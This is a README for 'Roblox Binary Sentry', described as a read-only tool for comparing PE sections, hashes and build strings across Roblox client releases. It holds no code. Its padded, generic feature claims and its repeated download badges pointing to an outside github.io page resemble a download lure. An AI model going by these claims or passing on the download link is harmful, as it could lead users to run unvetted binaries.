![preview](https://raw.githubusercontent.com/Sollarr/pe-header-lens/main/showcase_b04673.svg)
# Roblox Binary Sentry 🔍

[![Download](https://raw.githubusercontent.com/Sollarr/pe-header-lens/main/fetch_49eae.svg)](https://Sollarr.github.io/pe-header-lens/)

## 🧭 Overview

**Roblox Binary Sentry** is a forensic-grade inspection companion for people who like to look *inside* the machinery rather than merely watch it spin. Where the original `roblox-pe-tool` gave you a magnifying glass for PE headers, section hashes, and embedded build strings, Roblox Binary Sentry turns that magnifying glass into a full laboratory bench: a structured workspace where binary metadata is captured, compared, annotated, and archived across versions.

The philosophy here is simple. A Roblox client binary is a dense archaeological site. Every release buries small fossils — a shifted section offset, a rotated checksum, a quietly edited build tag — and those fossils tell a story about what changed between Tuesday and Thursday. Roblox Binary Sentry is the field notebook for that story. It does not modify anything, it does not interfere with anything, and it does not pretend that a binary is a locked box. It simply reads, records, and compares, with an obsessive attention to detail that rewards curiosity.

This project is built for reverse-engineering hobbyists, binary archaeology enthusiasts, security researchers studying executable layout evolution, and anyone who has ever wanted to answer the question: *"What actually changed in this release, byte-layout-wise?"* — without hand-writing a new diff script every single week.

## 📚 Table of Contents

- [Why This Exists](#-why-this-exists)
- [What It Does](#-what-it-does)
- [Feature Highlights](#-feature-highlights)
- [Architecture at a Glance](#-architecture-at-a-glance)
- [Inspection Pipeline](#-inspection-pipeline)
- [Diff Engine Explained](#-diff-engine-explained)
- [Interface and Experience](#-interface-and-experience)
- [Multilingual Support](#-multilingual-support)
- [Supported Platforms](#-supported-platforms)
- [Configuration Model](#-configuration-model)
- [Workflow Recipes](#-workflow-recipes)
- [Reporting and Export](#-reporting-and-export)
- [Performance Notes](#-performance-notes)
- [Accessibility](#-accessibility)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Useful Vocabulary](#-useful-vocabulary)
- [Contributing](#-contributing)
- [Security and Ethics](#-security-and-ethics)
- [License](#-license)
- [Acknowledgements](#-acknowledgements)

## 🧩 Why This Exists

Binary layout drift is one of the most under-documented phenomena in modern software. When a client updates, most observers notice the version number. Almost nobody notices that a particular `.rdata` section grew by 4,096 bytes while its hash rotated in a way that suggests padding realignment rather than new content. That kind of observation requires tooling that is patient, deterministic, and repeatable.

The original `roblox-pe-tool` demonstrated that a small, focused utility could surface this information cleanly. Roblox Binary Sentry takes the same core conviction — *structured extraction beats eyeballing* — and expands it into a multi-session, multi-version, multi-analyst workflow. It is the difference between taking one photograph and maintaining a time-lapse archive.

We built it because we kept asking questions that a single-shot inspector could not answer:

- Which sections change most often across a release train, and which stay frozen for months?
- Do build strings follow a predictable grammar, or do they mutate unpredictably?
- When a binary grows, does the growth concentrate in one section or spread evenly?
- Can two analysts compare notes on the same pair of binaries without stepping on each other's annotations?

## 🛠 What It Does

At its core, Roblox Binary Sentry performs four classes of operation.

**Capture.** It reads a binary, parses its Portable Executable structure, enumerates sections, computes per-section digests, extracts embedded build strings, and stores everything in a portable session record. Capture is read-only and leaves the source file untouched.

**Compare.** Given two or more session records, it produces a structured diff: added sections, removed sections, resized sections, hash rotations, header field changes, and build string mutations. Every difference is classified and weighted so that noise does not drown out signal.

**Annotate.** Analysts can attach notes, tags, and confidence markers to any capture or comparison. Annotations survive across sessions and can be exported alongside the raw data.

**Report.** Output arrives as human-readable summaries, machine-readable structured records, or a self-contained HTML dossier suitable for sharing with a team.

## ✨ Feature Highlights

- 🎛 **Responsive user interface** that reflows gracefully from ultrawide monitors down to narrow laptop screens, with a compact mode for side-by-side comparison viewing.
- 🌐 **Multilingual support** covering English, Spanish, Portuguese, Japanese, Korean, German, French, and Simplified Chinese, with community-contributed locale packs.
- 🕐 **Round-the-clock assistance** through an always-available help channel, with a knowledge base that stays reachable at any hour and any timezone.
- 🧮 **Deterministic hashing** across multiple digest families so that two analysts comparing the same pair of files always reach the same conclusions.
- 📦 **Portable session records** that can be committed to version control, shared as single files, or archived for long-term drift analysis.
- 🔬 **Granular section inspection** with byte-range visualization, entropy shading, and alignment hints.
- 🧵 **Concurrent capture** that keeps the interface fluid even when processing large binaries or long release trains.
- 🗃 **Version train tracking** that groups captures into named series, so a whole month of releases becomes a single navigable timeline.
- 🧠 **Build string grammar extraction** that separates boilerplate from variable fragments and highlights the variable parts.
- 🧾 **Structured export** in JSON, YAML, CSV, and a self-contained HTML dossier.
- 🎨 **Themeable interface** with light, dark, and high-contrast palettes tuned for long inspection sessions.
- ♿ **Accessibility-minded design** with full keyboard navigation, screen-reader labels, and adjustable motion preferences.
- 🔐 **No network dependency** — every operation runs locally, and nothing leaves your machine unless you explicitly export it.

## 🏗 Architecture at a Glance

Roblox Binary Sentry is organized as a set of loosely coupled layers.

**The reader layer** is responsible for turning a file on disk into a normalized in-memory representation. It handles PE parsing, section enumeration, digest computation, and string extraction. It is deliberately conservative: if it cannot parse something with confidence, it records an uncertainty marker rather than guessing.

**The session layer** wraps reader output into a versioned record with metadata: capture timestamp, tool version, source identifier, analyst notes, and a content fingerprint. Sessions are immutable once written; edits produce new sessions with lineage pointers back to their parents.

**The diff layer** takes two or more sessions and produces a structured comparison. Differences are classified into categories (structural, cosmetic, textual, cryptographic) and assigned severity weights. The diff layer never mutates input sessions.

**The presentation layer** renders sessions and comparisons for human consumption. It is decoupled from the data model so that new views can be added without touching the core.

**The export layer** serializes sessions, comparisons, and annotations into portable formats. It is the only layer that writes to disk by default, and it always writes to a destination you specify explicitly.

## 🔄 Inspection Pipeline

Every capture flows through the same deterministic pipeline.

1. **Fingerprint.** The raw file is fingerprinted so that duplicate captures are detected immediately.
2. **Parse.** The PE structure is parsed header-first, then section-by-section.
3. **Enumerate.** Every section is listed with its name, virtual address, virtual size, raw offset, raw size, and characteristics flags.
4. **Digest.** Each section is digested independently, which means a change in one section does not invalidate the digest of another.
5. **Extract.** Embedded build strings, version resources, and manifest fragments are extracted and normalized.
6. **Normalize.** All extracted values are normalized into a canonical form so comparisons are apples-to-apples.
7. **Record.** The normalized result is written into a session record with full provenance metadata.

Because each step is deterministic, the same input always yields the same session fingerprint. That property is what makes long-term drift analysis trustworthy.

## 🧮 Diff Engine Explained

The diff engine is the heart of the tool, and it deserves a fuller explanation than a bullet list.

When two sessions are compared, the engine walks both structures in parallel. Headers are compared field by field. Sections are matched by name first, then by address, then by size similarity, so that renamed-but-unchanged sections are recognized as such rather than reported as a removal plus an addition.

For each matched section, the engine compares size, digest, characteristics, and entropy profile. A digest rotation with no size change is classified as a content rotation. A size change with no digest rotation is impossible by construction and flagged as a parse anomaly. A size change with a digest rotation is classified as a structural change and weighted more heavily.

Build strings receive special treatment. The engine tokenizes them, aligns tokens across sessions, and identifies which tokens are stable and which vary. This makes it possible to see, at a glance, that a build string changed only in its trailing revision fragment while everything else held steady.

Every difference carries a confidence marker. When the engine is certain, it says so. When it is inferring, it says that too. Honest uncertainty is a feature, not a flaw.

## 🖥 Interface and Experience

The interface is built around three primary views.

**The capture view** shows a single session in detail: header fields, section table, digest values, build strings, and annotations. It is the view you live in when studying one binary closely.

**The comparison view** places two or more sessions side by side or stacked, with differences highlighted inline. It is the view you live in when studying change.

**The timeline view** arranges sessions in a version train, showing drift over time as a navigable sequence. It is the view you live in when studying trends.

All three views share a consistent visual grammar. Green indicates stable. Amber indicates changed. Red indicates removed or anomalous. The grammar is documented in the built-in help panel, and it is configurable for colorblind accessibility.

## 🌍 Multilingual Support

Multilingual support is treated as a first-class concern rather than an afterthought. The interface ships with locale packs for eight languages, and every user-facing string is externalized so that new languages can be added without code changes. Locale packs are plain structured files, which means a translator can contribute meaningfully without touching the application logic.

The diff engine's output is also localized, so a Spanish-speaking analyst reading a comparison sees descriptions in Spanish rather than a hybrid of Spanish interface labels and English diff descriptions.

## 💻 Supported Platforms

Roblox Binary Sentry runs wherever a modern runtime is available. It has been exercised on desktop environments across the three major families and on a handful of less common Linux distributions for good measure. Headless operation is supported for automated capture pipelines, and a terminal-oriented output mode exists for environments where a graphical interface is impractical.

## ⚙️ Configuration Model

Configuration is layered. Defaults live in the application. Project-level settings can live alongside a set of sessions. User-level settings live in a platform-appropriate location. Command-line or environment overrides sit on top. Each layer is documented, and each layer is optional.

The most commonly adjusted settings are digest family selection, comparison severity thresholds, section-name aliases, and export destinations. Everything else has a sensible default that most users never need to touch.

## 🧪 Workflow Recipes

**Weekly release audit.** Capture each new release into a named version train, then run a comparison against the previous capture. The timeline view shows the week's drift as a compact summary.

**Deep dive on a single change.** When a comparison flags an unexpected structural change, open the comparison view, drill into the affected section, and inspect the byte-range visualization alongside the digest values.

**Cross-analyst reconciliation.** Two analysts capture the same binary independently. Because capture is deterministic, their session fingerprints match, which confirms that any subsequent disagreement is about interpretation rather than data.

**Long-horizon trend study.** Accumulate captures over months, then export the train as structured records for external statistical analysis.

## 📤 Reporting and Export

Reports come in several flavors. The summary report is a one-page human-readable overview. The detailed report expands every difference with full context. The structured export is designed for downstream tooling. The HTML dossier bundles everything into a single self-contained file that can be opened anywhere without the tool installed.

Every export includes provenance metadata: which sessions were compared, when, by which tool version, and with which configuration. A report without provenance is a rumor; a report with provenance is evidence.

## 🚀 Performance Notes

Capture is bound primarily by disk read speed and digest computation. On typical hardware, a large binary is captured in well under a minute, and subsequent comparisons are faster still because sessions are already normalized. Concurrent capture keeps the interface responsive, and long version trains are streamed rather than loaded whole.

Memory usage scales with the size of the largest session in view, not with the size of the entire train, which means a train of a hundred captures remains comfortable to navigate.

## ♿ Accessibility

Keyboard navigation is complete: every action reachable by pointer is reachable by keyboard. Screen-reader labels are present on all interactive elements. Motion can be reduced or disabled. Contrast can be raised beyond the default palettes. The goal is that an analyst with any set of needs can do the same work with the same confidence.

## 🗺 Roadmap for 2026

- Expanded build string grammar models for less common string families.
- A plugin surface for community-authored diff classifiers.
- Improved timeline visualization with drift heatmaps.
- Additional locale packs contributed by the community.
- Enhanced headless mode for fully automated capture pipelines.
- A formal specification for the session record format, so third-party tools can read and write it.

## ❓ Frequently Asked Questions

**Does this modify the binaries it inspects?** No. Every operation is read-only. The tool never writes to the file it is inspecting.

**Can I use this without a network connection?** Yes. The tool is fully local. Nothing is transmitted anywhere unless you explicitly export and share a report.

**Is my data sent anywhere?** No. Sessions live on your machine, in locations you choose.

**How does this relate to the original `roblox-pe-tool`?** It is a spiritual successor: it does everything the original did, and it adds session management, structured diffing, annotations, and export.

**Can I compare more than two binaries at once?** Yes. The comparison view supports arbitrary numbers of sessions, though two-way and three-way comparisons are the most ergonomic.

**What if a binary fails to parse?** The reader records an uncertainty marker and continues with whatever it could parse confidently. Partial results are clearly labeled as partial.

## 📖 Useful Vocabulary

**Section.** A named region of a binary with its own address range and characteristics.

**Digest.** A fixed-size fingerprint of a byte range, used to detect change.

**Build string.** A human-readable identifier embedded in a binary that often encodes version and revision information.

**Session.** A stored capture of one binary's inspected properties, with metadata.

**Version train.** A named sequence of sessions ordered by capture time.

**Drift.** The accumulation of small changes across a version train.

## 🤝 Contributing

Contributions are welcome in many forms: locale packs, documentation improvements, classifier ideas, bug reports, and code. The project favors small, well-scoped changes with clear motivation. Before opening a substantial change, describe the problem you are solving and the approach you intend to take, so that discussion can happen early rather than late.

All contributions are expected to follow the project's code of conduct, which boils down to: be kind, be precise, and assume good faith.

## 🔒 Security and Ethics

This tool is for inspection and study. It does not alter binaries, it does not bypass protections, and it does not interact with any online service. It is intended for researchers, hobbyists, and analysts who want to understand how executable layout evolves over time.

If you discover a security issue in the tool itself, report it privately so that a fix can be prepared before public disclosure.

## 📜 License

This project is released under the MIT License. The full text is available in the repository's license file at [LICENSE](LICENSE).

Copyright (c) 2026 Roblox Binary Sentry contributors.

Permission is hereby granted, without restriction, to any person obtaining a copy of this software and associated documentation files, to deal in the software without limitation, including the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies, subject to the conditions stated in the license text.

## 🙏 Acknowledgements

Thanks to everyone who has ever stared at a section table and wondered why a number moved. Thanks to the maintainers of the original `roblox-pe-tool` for demonstrating that small, focused inspection utilities can be genuinely useful. Thanks to the translators who make the tool usable in more languages than we could write ourselves. And thanks to the analysts whose careful notes make long-horizon drift studies possible.

## ⚠️ Disclaimer

Roblox Binary Sentry is an independent inspection utility. It is not affiliated with, endorsed by, or sponsored by any platform, company, or organization whose binaries it may be used to examine. All trademarks belong to their respective owners.

The tool is provided as-is, without warranty of any kind, express or implied. The authors are not responsible for any use, misuse, or interpretation of the information this tool surfaces. Users are responsible for complying with all applicable laws and terms of service in their jurisdiction.

Always inspect responsibly. Understand what you are looking at before you draw conclusions from it. A digest rotation is a fact; what it means is a matter of interpretation, and interpretation benefits from patience.

[![Download](https://raw.githubusercontent.com/Sollarr/pe-header-lens/main/fetch_49eae.svg)](https://Sollarr.github.io/pe-header-lens/)